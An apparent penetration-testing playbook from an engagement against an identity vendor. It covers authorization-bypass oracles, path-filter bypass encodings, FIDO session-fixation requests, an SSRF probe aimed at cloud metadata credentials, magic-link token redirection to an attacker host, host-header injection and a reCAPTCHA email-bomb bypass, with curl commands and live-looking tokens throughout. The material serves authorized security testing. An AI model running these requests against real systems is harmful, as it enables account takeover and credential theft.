# HTTP / Auth / Filter-Testing Playbook

Reusable patterns for distinguishing filter-reject from controller-reject, sweeping authorization surfaces, testing magic-link flows, probing server-side URL construction, and detecting email-bomb bypasses.

---

## 1. Auth-filter vs controller-mapping test (the "did the filter or the bean reject it?" oracle)

The single most load-bearing methodology lesson in the engagement — it prevents false positives.

### The decision tree

| Response | What it means | Verdict |
|---|---|---|
| `403` with `{"detail":"Ensure the URL is valid"...}` (ALB/WAF envelope, no stack trace) | **Path-filter / WAF blocked it.** Did not reach the controller. | Endpoint is filtered — not necessarily "secured by `@PreAuthorize`" |
| `403 AccessDeniedException` (Spring Security, controller-scoped) | Reached controller, role check fired | Properly secured (annotation on controller) |
| `401 Unauthorized` | Auth layer (filter) rejected the token | Auth wall, not authz wall |
| `400` with body parse error (`InvalidJSONRequestProblem`, deserialization mismatch) | **AMBIGUOUS — DANGER.** Body schema didn't match. Says nothing about authz. |
| `400` with handler exception class in `type:` field (e.g. `/static/docs/jakarta/validation/ConstraintViolationException.html`) | **Reached business logic / validation layer** | Authz gap candidate — retest with valid body |
| `200` with data | Bypassed | Confirmed |
| `302 → /login` | Unauth redirect to SPA | CC-admin-session-gated |

### The case-variant SPA-fallback test (decisive for the AcmeAuth path-filter)

AcmeAuth's path filter is **case-sensitive** but Spring MVC routing is also case-sensitive — so case variants bypass the *filter* but fall through to the SPA static-resource handler, never the controller. This is the "looks like a bypass, isn't" trap:

```bash
# These reach the SPA handler (200 HTML) — NOT the controller:
GET /cc/api/acmeauth/AcmeAuth/idp/integrations/configured      -> 200 SPA HTML ("Error | AcmeAuth Control Center")
GET /cc/api/acmeauth/idp/INTEGRATIONS/configured           -> 200 SPA HTML
DELETE /cc/api/idp/Integration/ZZFAKE?rpAppId=cc       -> 405 Method Not Allowed (static-resource handler, GET-only)
```

**Diagnostic signature of SPA fallback vs controller:** SPA fallback serves Angular `index.html` (HTML, GET only → 405 on POST/DELETE), with title `"Error | <app>"`. A real controller hit returns JSON with the expected error envelope (`type: /static/docs/jakarta/...`). **The 405-on-non-GET is the cleanest discriminator.**

### The corrected methodology (what caught the F7 over-count)

> An automated sweep of all 254 `/cc/api/` endpoints with empty `{}` bodies showed 130+ endpoints returning 400 — initially misread as 18 bypassed namespaces. This was **Spring deserialization error, not authz bypass.** Correct procedure: for each 400 endpoint, look up the expected request schema in OpenAPI, craft a valid body, re-test. Only 200-with-data or 200-with-operation-confirm counts as bypassed.

---

## 2. Path-filter bypass ladder (ordered)

See `bypass-catalogue.md` §A for the full table and `scripts/path-bypass-fuzzer.sh` for the parameterized version. Recommended order:

1. **Path confusion headers** — `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For`, `X-Real-IP`, `X-Forwarded-Host`, `Forwarded`, `X-Original-Host`, `X-Host`, `X-Forwarded-Prefix`
2. **Suffix tricks** — `.json`, `.html`
3. **Trailing dot / slash / whitespace** — `/x.`, `/x/`, ` /x`
4. **Semicolon / matrix params** — `/x;.json`, `/x;jsessionid=y`
5. **`@` separator, null byte** — `/x@`, `/x%00`
6. **Single-encode** — `%2f`, `%2e`, `%61ctuator`
7. **Double-encode** — `%252f`, `..%252f`, `.%2e/`
8. **Path traversal literals** — `../`, `..//`, `..;/`, `....//`
9. **Tab / control char** — `%09` (works for Go `url.Parse` oracle; useless on Java WAF)
10. **Case variation** — `/ACTUATOR/env`, `/cc/Idp/...`
11. **Overlong UTF-8 / fullwidth / WEB-INF / META-INF** — `..%c0%af..`, `%ef%bc%8f`, `/WEB-INF/web.xml`

**AcmeAuth outcome on the patched target:** 20+ variants → all `403`/`400`/SPA-fallback. Only case-variation "bypasses" the filter and it is non-exploitable (SPA handler). The patched filter's signature response is `{"detail":"Ensure the URL is valid","status":403,"type":"InternalServerErrorException.html"}`.

---

## 3. Token-chain reachability matrix (how F5 was found)

### Methodology

Given a token of unknown scope, send it against **every** endpoint in a namespace and bucket the responses:

| Result | Count | Meaning |
|---|---|---|
| `403 AccessDeniedException` | 78 | Role check fired — properly secured |
| `200` with data | 1 | **Missing `@PreAuthorize`** — the gap |
| `401 / 404 / 405 / SPA-fallback` | 175 | Auth wall / not-routable |

The single `200` among 78 properly-secured `403`s is the authorization gap. The 78:1 ratio is itself the evidence — the authz layer *is* enforced class-wide, this endpoint is the sole miss.

### Concrete matrix script

```bash
WS_TOKEN="hypwo-cbdb2734-3647-4216-b54e-00acf1e63ec6"   # WORKSTATION-scoped

python3 -c "
import json,subprocess
d=json.load(open('openapi-spec.json'))
for p in d['paths']:
  if p.startswith('/cc/api/') and 'get' in d['paths'][p]:
    r=subprocess.run(['curl','-s','-o','/dev/null','-w','%{http_code}',
      '-H',f'Authorization: Bearer $WS_TOKEN',
      f'https://tenant-001.cdn.acmeauth.example{p}'],capture_output=True,text=True).stdout
    print(r, p)" | sort | uniq -c
```

See `scripts/authz-matrix.sh`.

### Token-type verification (differentiate auth-fail from scope-fail)

| Token | Bypassed endpoint | Other `/cc/api/` |
|---|---|---|
| `hypwo-` (WORKSTATION Bearer) | 200 data/operation | 403 |
| `hypws-` (WS Install, pre-exchange) | 200 data/operation | 403 |
| Random UUID | 401 | 401 |
| No token | 401 | 401 |

Both WORKSTATION-prefixed tokens bypassed; invalid tokens rejected at auth layer. Confirms the gap is authz (scope), not auth.

### Per-method matrix for the bypassed controller (F9 extension)

After finding one bypassed endpoint, sweep **all methods** of that controller namespace with the same token and a schema-valid body:

| Method | Endpoint | Result |
|---|---|---|
| GET | `/cc/api/acmeauth/idp/integrations/configured` | 200 + secrets (F5) |
| GET | `/cc/api/idp/integration/enablement?rpAppId=X` | 200 (reached logic) |
| POST | `/cc/api/idp/suspend/{provider}` | 200 `isSuccessful:true` (F7) |
| POST | `/cc/api/idp/qr/setQR` | 200 (F7) |
| GET | `/cc/api/support/allowed?email=X` | 200 `isAllowed:true` (F7) |
| DELETE | `/cc/api/idp/integration/{provider}?rpAppId=X` | 200 `isSuccessful:true` destructive (F9) |

---

## 4. FIDO2 / WebAuthn testing patterns

See `fido-webauthn-testing.md` for full flows and CBOR PoC. Summary:

```
POST /fido2/attestation/options   # issues WebAuthn reg challenge for ANY username, leaks excludeCredentials
POST /fido2/attestation/result    # accepts forged fmt:"none" attestation, PERSISTS to victim account
POST /fido2/assertion/options     # returns full allowCredentials array (credential inventory)
```

- Size oracle: 47.9× size amplification (11,740 vs 245 bytes).
- excludeCredentials leak: victim's complete list of existing credential IDs.
- `fmt:"none"` requires no attestation chain.

---

## 5. Magic-link flow testing

### The chain (where each step stops)

| Step | Endpoint | Auth | Returns | Stop point |
|---|---|---|---|---|
| 1 | `GET /rp/versioned/magiclink/register?token=<T>` | **None** | 256-bit PIN + rpAppId + rpUrl | Works (pre-patch) |
| 2 | `POST /rp/versioned/device/setup` `{pin,mobileType,actionId}` | None (uses PIN) | `machineUserName` + `sessionId` | Works |
| 3 | `POST /rp/versioned/device/registrations` | sessionId | 404 `OOBChallengeNotFound` | **Blocked — requires EC keypair** |
| 4 | `POST /rp/deviceapi/device/query/ws/status` | sessionId-derived | 401 | Blocked |
| 5 | `POST /rp/wsapi/client/setup` | sessionId | 401 | Blocked |

```bash
TOKEN="5c526ff6..."
curl -s "https://tenant-001.cdn.acmeauth.example/rp/versioned/magiclink/register?token=$TOKEN"
# {"rpAppId":"controlCenterAdmin","rpUrl":"https://tenant-001.cdn.acmeauth.example/rp","pin":"77019d97c98ddac3..."}

curl -s -X POST "https://tenant-001.cdn.acmeauth.example/rp/versioned/device/setup" \
  -H 'Content-Type: application/json' \
  -d '{"version":4,"pin":"77019d97...","mobileType":"ANDROID","actionId":""}'
# {"status":{"responseCode":200,"responseMessage":"PIN match successful"},
#  "response":{"machineUserName":"w1th0ut2356@gmail.com","sessionType":"MAGIC_LINK","sessionId":"76a2bb6b..."}}
```

### Token-oracle and PIN-replay tests

| Test | Result |
|---|---|
| Valid token | 200 + PIN |
| Invalid token (64 hex zeros) | 404 |
| Short token (`abc`) | 404 |
| PIN replay (same PIN many times) | 200 "PIN match successful" each time — **PINs not single-use** |
| 10 rapid PIN-leak requests | 10/10 × 200 — **no rate limit, no lockout, no CAPTCHA** |

### acmeauthServerUrl injection (F4b)

```bash
# /cc/basic/magiclink/admin — MagicLinkRequestAdmin schema:
# {username, requestorEmail, rpAppId, secondsValid, message, acmeauthServerUrl}
curl -s -b admin.jar -X POST "https://tenant-001.cdn.acmeauth.example/cc/basic/magiclink/admin" \
  -H 'Content-Type: application/json' \
  -d '{"username":"x@example.com","requestorEmail":"x","rpAppId":"controlCenterAdmin",
       "secondsValid":3600,"message":"x",
       "acmeauthServerUrl":"https://evil-attacker-verify.example.com/magiclinkadmin"}'
# Response: webLink = "https://evil-attacker-verify.example.com/magiclinkadmin?token=0e01...66a4"
```

`acmeauthServerUrl` is concatenated directly into the `webLink` with the admin-issued token appended as `?token=`. No allowlist, no scheme/host validation.

### Why F4b is post-auth only

`/cc/basic/magiclink/admin` requires an authenticated CC admin session. It therefore **cannot be the initial entry point** for F4 — it only extends an existing compromise. It is a post-exploitation vector.

### secondsValid abuse

`secondsValid` is a documented required field of `MagicLinkRequestAdmin`. The field controls the magic-link token's lifetime. In combination with an attacker-controlled `acmeauthServerUrl`, an admin (or an F7-style authorization-bypass caller) could mint arbitrarily long-lived magic links pointed at attacker infrastructure.

---

## 6. FIDO1 UAF testing

See `fido-webauthn-testing.md` §FIDO1. Summary:

```bash
# op=Reg — issues a real FIDO1 challenge bound to attacker-supplied username, echoes sessionId verbatim
curl -s -X POST https://pentesting2.cdn.acmeauth.example/rp/fido/get \
  -H 'Content-Type: application/json' \
  -d '{"fidoPayload":{"context":{"transaction":"Reg","userName":"admin@acmeauth.example"},
       "op":"Reg","extras":{}},
       "session":{"deviceId":"d","machine":"m","sessionId":"attacker-controlled-001",
       "machineUserName":"admin@acmeauth.example"}}'
# {"status":{"responseCode":200,"responseMessage":"Registration Success"},
#  "response":{"sessionId":"attacker-controlled-001",      <-- VERBATIM echo = session fixation
#  "fidoResponse":{"uafRequest":"[{\"header\":{...},\"challenge\":\"YmJhdnFxczNr...\",
#                   \"username\":\"admin@acmeauth.example\",...}]","statusCode":1200}}}

# op=Dereg — same, "Deregistration Success"
# op=Auth — ALWAYS 500
curl -i -X POST https://pentesting2.cdn.acmeauth.example/rp/fido/get -H 'Content-Type: application/json' \
  -d '{"fidoPayload":{"context":{"transaction":"Auth","userName":"admin@acmeauth.example"},"op":"Auth","extras":{}},
       "session":{"sessionId":"x"}}'
# HTTP/2 500  {"type":"/static/docs/jakarta/ws/rs/InternalServerErrorException.html",
#              "detail":"...ExceptionId: c9dcc805-7813-4a4f-941c-c9c8fd128e43"}
```

### Why op=Auth always 500s

The auth code path **does not handle the "user has no registered authenticators" case** — it throws an uncaught `InternalServerErrorException` with a fresh `ExceptionId` UUID per request. This is a server-side bug, not a graceful error. The 500 fires even for `admin@acmeauth.example` (a real user with many FIDO2 but no FIDO1 credentials). It is a **state-pollution oracle** for log correlation and a DoS amplifier (stack-trace generation is CPU-expensive).

### Why /rp/fido/send/reg strictly validates TLV

| Variant | Result |
|---|---|
| Raw JSON of an attempted `RegResponse` | 400 `InvalidJSONRequestProblem` |
| Serialized-string form | 500 `InternalServerErrorException` |
| Echo-only challenge (no authenticator signature) | 400 |
| TLV with correct outer structure but bogus signature | 400 |

**This is why F22 is HIGH (7.3) and not CRITICAL** — without a real FIDO1-compliant authenticator, the credential-registration step cannot be completed. The cap is unauth state-creation + session-fixation + DoS amplifier.

### Architectural signal worth noting

`/rp/fido/send/dereg` returns a Spring Boot default error envelope (`{"timestamp":...,"status":400,"error":"Bad Request","path":...}`) that differs from the Jakarta `InvalidJSONRequestProblem` envelope returned by every other `/rp/fido/*` endpoint. This is a **microservice-boundary signal** — consistent with either a separate Spring Boot service instance or a different `@ControllerAdvice`/exception-handler chain in the same app. Useful for microservice mapping when corroborated by independent signals (independent egress IP, independent TLS cert, independent UA); the envelope difference alone does *not* prove service separation.

### Version diff

v11.5.0 (`sampleapp.dev.acmeauth.example`) returns 404 for `/rp/fido/get` — the endpoint was removed. v11.1.0 (`tenant-demo`) and v11.3.0 still expose it.

---

## 7. Server-side URL-construction detection (Go vs Java)

### Go url.Parse error leak (the %09 oracle)

When a Go backend does naive string interpolation `baseUrl + workflowId + suffix` and runs the result through `url.Parse`, a **control character in the user input** triggers `net/url: invalid control character in URL` and the **full parsed URL is echoed in the error body** — leaking the upstream host and the URL-construction template:

```bash
# F23 — Affirm proxy (Go):
curl -sk "https://verify.acmeauth.example/api/workflow-results?workflowId=%09"
# 500: {"error":"parse \"https://tenant-demo.cdn.acmeauth.example/cc/api/idv/workflow/\t/results\":
#              net/url: invalid control character in URL"}
```

The `\t` in the error is the decoded tab. This tells you: (a) backend is Go, (b) upstream host is `tenant-demo.cdn.acmeauth.example`, (c) URL template is `https://tenant-demo.cdn.acmeauth.example/cc/api/idv/workflow/{workflowId}/results`, (d) the value is interpolated, not path-joined.

**The SSRF proof** (different from the leak): a value that survives `url.Parse` becomes the upstream path:

```bash
curl -sk "https://verify.acmeauth.example/api/workflow-results?workflowId=:8080/admin"
# 200, 6784-byte AcmeAuth CC login/error HTML (proxy reached /cc/api/idv/workflow/:8080/admin/results
# upstream AND was authenticated — direct unauth GET of that path returns 401)
```

### Java HTTP client fetch signatures (the JWKS-fetch family, C2/C4)

When a Java backend fetches a URL during validation (even when the request ultimately 400s), the **`User-Agent` header** of the outbound fetch identifies the runtime:

| Sink | Outbound UA | Egress IP | Trigger field |
|---|---|---|---|
| C2 — `POST /cc/ui/token` | `Java/17.0.17` | `52.2.185.255` (AWS us-east-1) | `jwksUrl` in OAUTH_CLIENT_CREDENTIALS token create |
| C4 — `/cc/ui/idv/oidc` | Java/17 | AWS | `jwksUrl` in IDV OIDC config (separate Spring controller) |
| C1 — Adapt OPA `http.send` | `Go-http-client/2.0` | `98.93.120.50` | Rego `http.send({"url":...})` |
| C3 EventBridge | `Amazon/EventBridge/ApiDestinations` | `44.214.10.90` | `invocationEndpoint` |
| C3 Proxy verify | Spring `HttpClientErrorException` body reflected | — | `proxies[].host`+`port` |

**Diagnostic**: catch outbound hits on `webhook.site`/`requestbin` and read the UA + source IP. Different UA = different code path = needs independent patching (the engagement found 4 distinct SSRF sinks across subsystems).

### C2 reproduction (Java jwksUrl fetch on 400)

```bash
curl -s -b admin.jar -X POST https://tenant-001.cdn.acmeauth.example/cc/ui/token \
  -H 'Content-Type: application/json' -H "X-CSRF-TOKEN: $CSRF" \
  -d '{"name":"x","rpAppId":"cc","scope":[],"type":"OAUTH_CLIENT_CREDENTIALS",
       "ttl":3600,"oauthClientId":"x","jwksUrl":"https://webhook.site/<UUID>/latest/meta-data/iam/security-credentials/",
       "jwksUrlAllowRedirect":false,"oauthBearerTokenTTLSecs":600}'
# Request ultimately 400s, but webhook.site receives a GET from Java/17.0.17 first.
```

### String-interpolation vs URL-builder heuristic

- **String interpolation** (F23 Go, C3 proxy): user value lands inside a larger template; control chars / `:8080` / `..%2f` cause parse failures or path redirection. The `%09` test is the discriminating signal.
- **URL builder** (`u.JoinPath`, `url.PathEscape`): control chars are rejected cleanly with a 400, no internal template leaked.

---

## 7.5 RFC 7807 error-envelope fingerprinting (framework-layer AND application-layer leaks)

When a Spring Boot / JAX-RS backend emits an RFC 7807 problem-detail response (`{"type":"...","title":"...","status":...,"detail":"..."}`), the **`type` field value is the load-bearing disclosure** — and it has two distinct leak classes that should both be enumerated.

### Layer A — Framework / library package paths

The `type` field points at the **framework's own** exception-class HTML doc page. Examples observed on AcmeAuth:

| Envelope `type` value | Meaning |
|---|---|
| `/static/docs/jakarta/ws/rs/ConstraintViolationException.html` | Jakarta JAX-RS bean-validation rejection (RFC 7807 wrapper on `@Valid` failure) |
| `/static/docs/jakarta/ws/rs/InternalServerErrorException.html` | generic Jakarta 500 wrapper — **also the WAF rejection envelope** (see §1 `Ensure the URL is valid`) |
| `/static/docs/org/springframework/...` | Spring framework exception class |

### Layer B — Application-internal Java package paths (the missed pattern)

The same `type` field can point at **the application's own** exception class, leaking the internal Java package structure of the codebase. Examples observed on AcmeAuth:

| Finding | Envelope `type` value (truncated) | What it discloses |
|---|---|---|
| F27 (FIDO2 settings null) | `/static/docs/com/acmeauth/server/rp/errorhandling/fido2/FIDO2SettingsModelIsNullProblem.html` | internal package `com.acmeauth.server.rp.errorhandling.fido2` exists; `FIDO2SettingsModelIsNull` is a named exception |
| F16 (FIDO2 invalid input) | `com.acmeauth.server.fido2.errorhandling.InvalidInputProblem` (in body, not as `type`) | internal package `com.acmeauth.server.fido2.errorhandling` |
| featureflags | `.../featureflags/errorhandling/...Problem.html` | a separate `featureflags` subsystem exists |
| rp.errorhandling.fido2 | `.../rp/errorhandling/fido2/...Problem.html` | confirms `rp` (relying-party) is a separate module from `fido2` |

**Why this matters.** Each distinct `com.acmeauth.server.<subsystem>.errorhandling.<Name>Problem` value is a direct map of the codebase's subsystem boundaries. Triager and researcher both gain: (a) confirmation that a subsystem exists, (b) the exact exception class name to grep for in any leaked source, (c) a fingerprint to cluster which backend instance a route is handled by when other signals (UA, egress IP, TLS cert) are ambiguous.

**Test recipe.** For every endpoint that returns an RFC 7807 body, force each error class in turn and capture the `type` field:

```bash
# Trigger one of each: validation failure, malformed JSON, missing field, server error
for body in '{}' 'not-json' '{"username":null}' '{"username":"\u0000"}'; do
  curl -s -X POST "https://$TENANT/fido2/attestation/options" \
       -H 'Content-Type: application/json' -d "$body" \
    | jq -r '"\(.status // "?")  type=\(.type // "-")  title=\(.title // "-")"'
done
# Repeat for every /rp/*, /fido2/*, /cc/* route — cluster by type to map subsystems.
```

**Generalization rule.** Whenever you collect RFC 7807 envelopes, do NOT only compare `status`/`title`/`detail` — the discriminating signal is the **path component of `type`**. Split it into framework paths (`jakarta/`, `org/springframework/`, `javax/`, `com/fasterxml/`) vs application paths (`com/<vendor>/...`) and treat each application path as one subsystem boundary datapoint.

---

## 8. Email-bomb testing (reCAPTCHA bypass)

`/api/send-code` on the Affirm Go backend enforces Google reCAPTCHA server-side for all domains **except** `*@acmeauth.example`. Bypass logic is `email.toLowerCase().endsWith('@acmeauth.example')`.

```bash
curl -sk -X POST https://verify.acmeauth.example/api/send-code \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@acmeauth.example","recaptchaToken":""}'
# 200 {"message":"Verification code sent"}
```

### The 18-variant probe matrix (confirmed the endsWith logic)

| Email | recaptchaToken | Response |
|---|---|---|
| `admin@acmeauth.example` | `""` (empty) | **200** |
| `support@acmeauth.example` | `""` | **200** |
| `randomname12345@acmeauth.example` | `""` | **200** |
| `test@ACMEAUTH.EXAMPLE` (case-insensitive) | `""` | **200** |
| `test+tag@acmeauth.example` (plus-addressing) | `""` | **200** |
| `test@acmeauth.example ` (trailing ws) | `""` | **200** |
| ` test@acmeauth.example` (leading ws) | `""` | **200** |
| `test@acmeauth.example\n` (trailing newline) | `""` | **200** |
| `admin@acmeauth.example` | (missing) | **200** |
| `admin@acmeauth.example` | `"test"` | **200** |
| `admin@acmeauth.example` | `"A"×500` | **200** |
| `test@example.com` (non-acmeauth) | `""` | 400 "reCAPTCHA verification failed" |
| `test@x.acmeauth.example` (subdomain) | `""` | 400 |
| `test@acmeauth.examplex` | `""` | 400 |
| `test@acmeauth.example.au` | `""` | 400 |
| `test@acmeauth.example.evil.com` | `""` | 400 |
| `test@acmeauth.example\x00evil.com` (null byte) | `""` | 400 |

**Interpretation:** plus-addressing/whitespace/newline pass because they're stripped *before* the endsWith check; subdomain/null-byte/`.au`/`.comx` all fail → confirms **exact `endsWith('@acmeauth.example')`**, not a regex or domain parse. It is NOT an open relay — blast radius is AcmeAuth's own corporate mailboxes.

### Rate-limit absence (6 sequential, no 429)

6 sequential `send-code` POSTs to `ratelimit-test@acmeauth.example`, all 200, no `Retry-After`, no `X-RateLimit-*`, <3s total. The companion `/api/verify-code` DOES rate-limit (2 wrong → "Too many failed attempts"), but `/api/send-code` does not. The differential is itself a finding.

---

## 9. Host-header injection (when does it actually work?)

See `bypass-catalogue.md` §B for the full table. Key point:

```bash
# Baseline:
curl -sk -i https://sampleapp.dev.acmeauth.example/auth/realms/master/.well-known/openid-configuration | grep -i location
# location: https://acmeauthcorp.okta.com/oauth2/default/v1/authorize?...redirect_uri=https%3A%2F%2Fsampleapp.dev.acmeauth.example%2Foauth2%2Fidpresponse...

# With attacker Host:
curl -sk -i -H 'host: evil.attacker.com' https://sampleapp.dev.acmeauth.example/auth/realms/master/.well-known/openid-configuration | grep -i location
# location: https://acmeauthcorp.okta.com/oauth2/default/v1/authorize?...redirect_uri=https%3A%2F%2Fevil.attacker.com%2Foauth2%2Fidpresponse...
```

### The Okta CSP frame-ancestors reflection bonus

Okta reflects the `redirect_uri` host into `Content-Security-Policy: frame-ancestors`:

```bash
curl -sk -i 'https://acmeauthcorp.okta.com/oauth2/default/v1/authorize?client_id=0oa16aklnydj3amKW358&redirect_uri=https://evil.attacker.com/oauth2/idpresponse&response_type=code&scope=openid&state=abc' | grep -oE 'frame-ancestors[^;]+'
# frame-ancestors 'self' https://evil.attacker.com
```

Combined with the Host injection, an attacker can whitelist their own origin for embedding the Okta credential form — clickjacking on the Okta login.

### The AC:H reasoning (why it's Low, not High)

> The prior 'High' treated Host as freely attacker-controllable. It is not — RFC 7230 forbids clients from setting arbitrary Host, and modern browsers enforce this. The attack requires either (a) MITM position on a proxy/CDN that forwards attacker-supplied Host, or (b) a victim using a tool like curl. AC:H is correct.

**When Host-header injection actually works:** only when an intermediary (corporate forward proxy, cache, downstream CDN, misconfigured reverse proxy) **forwards the attacker-supplied Host to the origin**. Direct browser-to-origin traffic cannot exploit it. So: scan for proxies that forward Host; otherwise treat as defense-in-depth.

---

## 10. Workstation / Install / Magic token chain (taxonomy & mintability)

### Prefix taxonomy

| Prefix | Token type | Scope | TTL |
|---|---|---|---|
| `hypws-` | WS Install token | install/bootstrap | **unexpiring** (valid across days, re-confirmed 5 mints) |
| `hypwo-` | WORKSTATION Bearer (minted from hypws-) | WORKSTATION (lowest device-priv) | ~89 days (`expiryDate: 1792495445831` = 2026-10-21 from a 2026-07-22 mint) |
| CC admin session | `SESSION` cookie (base64 UUIDv4, Spring Session server-side) + `X-CSRF-TOKEN` | ADMIN / CONTROL_CENTER | sliding (TTL not in corpus — do not propagate uncorroborated) |

The 89-day Bearer vs unexpiring install is the key TTL asymmetry.

### F8 — infinite mintability (still live post-patch)

```bash
INSTALL_TOKEN="hypws-41ae1881-e0e3-4f64-b6e7-5a2b22283bb6"

curl -s -X POST "https://tenant-001.cdn.acmeauth.example/rp/token/endpoint/exchange/installtoken" \
  -H 'Content-Type: application/json' \
  -d '{"wsinstallToken":{"token":"'"$INSTALL_TOKEN"'","machineId":"retest","rpAppId":"AcmeAuthDefaultWorkstationApplication"}}'
# {"token":"hypwo-42288d91-f4a0-4162-9c45-6f72f1e5dbdf","expiryDate":1792853004673}
```

10 consecutive mints produced 10 distinct Bearer tokens. The `rpAppId` is validated (mismatch → 403) but within the same rpAppId, unlimited tokens. AcmeAuth's 2026-07-23/24 patch closed the *downstream* IdP endpoints but **did not touch the token-issuance surface**.

### Cross-tenant isolation (negative)

- tenant-001 install token → portal.acmeauth.example: `401 "Cannot find hypws-41"` (tenant-bound)
- tenant-001-minted `hypwo-` → portal.acmeauth.example: 200 only for `/rp/versioned/features` (tenant-scoped, no privileged access)

### Mintability tests that FAILED (the valid-secret-isn't-enough case)

The F5-leaked `keycloakSecret` cannot mint tokens even though the secret is recognized as valid:

| Grant type | Error |
|---|---|
| client_credentials | `unauthorized_client` / "Client not enabled to retrieve service account" |
| password | `unknown_error` (realm disabled) |
| token-exchange | `invalid_request` / "Parameter 'subject_issuer' is not supported" |

Secret-validity confirmed by error differentiation: leaked secret → "Client not enabled" (recognized); random `WRONG_SECRET_12345` → "Invalid client or Invalid client credentials".

### OAuth client_assertion (unmintable)

`POST /rp/token/endpoint/exchange/clientcredentials` requires a `client_assertion` signed JWT signed by a AcmeAuth-issued app client private key — standard OAuth2, no abuse path without that key.

---

## 11. CSRF-token unauth issuance (by-design, automation enabler)

```bash
# POST, not GET (GET returns 500):
TOKEN=$(curl -s -b cj -c cj -X POST https://tenant-001.cdn.acmeauth.example/cc/dtsg97305 | jq -r .token)
# {"token":"<UUIDv4>","headerName":"X-CSRF-TOKEN","parameterName":"_csrf"}
```

- Unauthenticated, no CAPTCHA, no rate limit
- Tokens are random UUIDv4 (5/5 unique across rapid calls) — not enumerable
- Not usable as a session (CC UI redirects to `/login`)
- Required by the FIDO2 assertion flow

### Why this is by-design but enables automation

Standard Spring Security CSRF endpoint behavior — login forms need CSRF tokens before authentication. **Not a vuln.** The marginal risk: it makes scripted FIDO2-flow automation trivial (no human interaction to acquire the CSRF token), which is the precondition that makes F13's browser-mediated assertion completion scriptable.

The full unauthenticated automation chain is: mint CSRF → mint session cookie → call `/login/fido2/assertion/options` → drive the browser assertion flow.

---

## 12. OpenAPI / Postman attack-surface mapping

### The counts (verified against local spec)

| Metric | Count |
|---|---|
| Paths | **667** |
| Total operations | 854 |
| State-changing (POST/PUT/PATCH/DELETE) | **535** |
| GET | 319 |
| POST | 341 |
| PUT | 59 |
| DELETE | 93 |
| PATCH | 42 |

### Discovery sources

1. **`apidocs.<domain>`** (Postman-hosted public docs) — 295 endpoints / 231 paths, organized into CC (`/cc/api/**`, 116), RP Applications (136), FIDO2 RP API, RADIUS, Analytics, FIDO API.
2. **`loggedIn.js` SPA bundle** (3.1 MB) — extract all 263 `/cc/ui/*` + `/cc/api/*` API paths; this is how C4 was found.
3. **Local `openapi-spec.json`** — 667 paths (the most complete; includes internal endpoints not in the public Postman collection).

### Attack-surface candidate classification

| Candidate class | Where to look | Vuln class |
|---|---|---|
| **URL-accepting fields** | `jwksUrl`, `invocationEndpoint`, `acmeauthServerUrl`, `proxies[].host`, `webhookUrl`, `ssoUrl`, `keycloakWellKnownEndpoint` | SSRF (C1–C4, F23) |
| **Email-render fields** | `/cc/api/email/send/template`, `/cc/api/email/customizations/:templateId/version` | SSTI (admin-gated, unverified) |
| **Filter/sort/search params** | `sortBy`, `orderBy`, `filter`, `q`, `search` on `/cc/ui/audit/search`, `/cc/ui/idv/activity-log/search`, `/cc/ui/integrations/adapt/events/search` | SQLi (negative — Jakarta `@Pattern`, parameterized) |
| **Execute-evaluate fields** | `/cc/api/integrations/adapt/policies/policy_evaluation/test` (Rego), `/cc/api/idv/code-customization/test`, `/cc/api/jobs/scheduler/*`, `/cc/api/reports/execute` | RCE/SSRF (admin-gated) |
| **State-changing with `{provider}/{rpAppId}` path params** | `/cc/api/idp/{verb}/{provider}?rpAppId=X` | Authz bypass (F7/F9) |
| **Unauth JSON sinks** | `/logs`, `/fido2/attestation/result`, `/rp/fido/get` | SSTI/SQLi/log-injection (mostly negative; F22 state creation) |

### Methodology for prioritizing the 535 state-changing ops

1. Bucket by controller namespace (`/cc/api/idp/*`, `/cc/api/email/*`, etc.)
2. For each namespace, identify the **auth gate** (path-filter? `@PreAuthorize`? scope enum?) via the §1 oracle.
3. For namespaces where a low-scope token (WORKSTATION) reaches the controller, sweep all methods (the F7→F9 expansion pattern).
4. For URL-accepting fields, send a `webhook.site` URL and check the inbound UA against the §7 table (Java vs Go vs AWS — different code path = independent patch needed).
5. For each enumeration claim, always run a **negative control** (`zzznonexistent1785022468@nowhere.com`) — this is what caught F25 (false positive) and cleared F12.

---

## Cross-cutting methodology notes (recurring lessons)

1. **Negative control is mandatory for any differential/enumeration claim.** F25 was retracted when a clearly-nonexistent username showed the same response as `administrator`. The `/login/fido2/assertion/options` endpoint returned structurally identical 246-byte responses for `admin@acmeauth.example` AND `nonexistent_user_99999` — correctly clearing it.

2. **400 ≠ authz bypass.** Spring deserialization errors (body schema mismatch) look like bypasses in automated sweeps. Always re-test with a schema-valid body before claiming bypass.

3. **The "200 with status:failed" mitigation is not a code fix.** F13's per-tenant toggle returns HTTP 200 with `{"status":"failed",...}` — not 401/403. The unauthenticated code path (CWE-306) is unchanged. 3 of 11 tenants were still live after the "fix".

4. **Response envelope fingerprinting** distinguishes the layer that rejected the request:
   - `{"detail":"Ensure the URL is valid"}` + `InternalServerErrorException.html` → WAF/path-filter (ALB)
   - `AccessDeniedException` → Spring Security controller authz
   - `InvalidJSONRequestProblem` / `ConstraintViolationException.html` → reached business logic (authz gap candidate)
   - SPA HTML `"Error | <app>"` → fell through to static handler (case-variant trap)
   - Jakarta path `/static/docs/jakarta/ws/rs/...` → JAX-RS layer (FIDO1 service)
   - Spring Boot `{"timestamp":...,"status":...,"error":...,"path":...}` → separate Spring Boot instance (microservice boundary signal)

5. **Per-tenant config sweeps expose partial mitigation.** Always enumerate all known tenants against any patched endpoint — AcmeAuth-style vendors apply fixes per-tenant, inconsistently.
